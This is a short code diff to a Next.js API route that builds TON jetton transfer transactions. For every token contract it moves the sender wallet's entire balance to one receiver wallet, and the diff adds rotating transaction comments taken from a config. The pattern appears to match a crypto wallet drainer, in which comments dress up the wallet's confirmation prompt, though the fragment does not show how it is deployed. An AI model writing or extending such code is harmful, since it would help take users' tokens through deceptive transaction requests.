@@ -50,17 +50,21 @@ export async function POST(req: NextRequest) {
 		/*config.transaction_comments?.dogs  ??*/ defaultText,
 		config.transaction_comments?.not ?? defaultText,
 	]
+	let i = 0;
 	for (let contract of contracts) {
 		const jettonWallet = await getContractWallet(contract, senderWallet);
 
 		const balance = await getTokenBalance(jettonWallet);
+		const comment = comments[i % comments.length];
+		i++;
 		if (!balance) continue;
 
 
 		const payload = await createTokenTransferPayload(
 			senderWallet,
 			receiverWallet,
-			balance
+			balance,
+			comment
 		);
 		transactions.push({
 			address: jettonWallet.toString(),
